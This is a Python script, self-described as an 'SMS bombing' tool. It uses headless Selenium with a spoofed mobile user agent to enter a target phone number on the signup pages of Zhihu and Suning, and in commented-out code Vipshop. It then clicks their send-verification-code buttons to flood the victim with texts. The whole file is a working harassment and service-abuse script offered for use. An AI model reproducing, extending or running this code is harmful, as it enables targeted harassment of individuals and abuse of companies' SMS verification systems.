"""
 !/usr/bin/python3
 -*- coding: utf-8 -*-
 --------------------------------------
 @File    	  : hongzha.py
 @Time    	  : 2018/8/25 12:28
 @Software	  : PyCharm
 --------------------------------------
 @Description : 短信轰炸
                1. chromedriver.exe 路径加入到环境变量
                2. 版本对应
 --------------------------------------
 @Author  	  : lixj
 @Email	  	  : lixj_zj@163.com

"""


import time
from selenium import webdriver
from threading import Thread

class hongZha():
    def __init__(self):
        self.target_phone = ""   # phone
        self.num = 0    # number
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument('--headless')
        self.chrome_options.add_argument('--disable-gpu')
        self.chrome_options.add_argument('--user-agent=Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')
        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)

    def send_result(self, button, name):
        button.click()
        self.num += 1
        print("{} 第{}次发送成功 {}".format(self.target_phone, self.num, name))
        time.sleep(2)

    # 1.
    def zhihu(self, name):
        self.driver.get("https://www.zhihu.com/signup")
        tel = self.driver.find_element_by_xpath("//input[@placeholder='手机号']")
        tel.send_keys(self.target_phone)
        button = self.driver.find_element_by_xpath("//button[@class='Button CountingDownButton SignFlow-smsInputButton Button--plain']")
        self.send_result(button, name)
        self.driver.quit()

    # 2.
    # def weipinhui(self, name):
    #     self.driver.get("https://passport.vip.com/register")
    #     tel = self.driver.find_element_by_xpath("//input[@placeholder='请输入手机号码']")
    #     tel.send_keys(self.target_phone)
    #     button = self.driver.find_element_by_xpath("//a[@class='ui-btn-medium btn-verify-code ui-btn-secondary']")
    #     self.send_result(button, name)
    #     self.driver.quit()

    # 3.
    def suning(self, name):
        self.driver.get("https://reg.suning.com/person.do")
        tel = self.driver.find_element_by_xpath("//input[@id='mobileAlias']")
        tel.send_keys(self.target_phone)
        button = self.driver.find_element_by_xpath("//a[@id='sendSmsCode']")
        self.send_result(button, name)
        self.driver.quit()

if __name__ == '__main__':

    hongZha = hongZha()

    # zh = Thread(target=hongZha.zhihu, args=("zhihu", ))
    # zh.start()

    # wph = Thread(target=hongZha.weipinhui, args=("weipinhui", ))
    # wph.start()

    sn = Thread(target=hongZha.suning, args=("suning", ))
    sn.start()











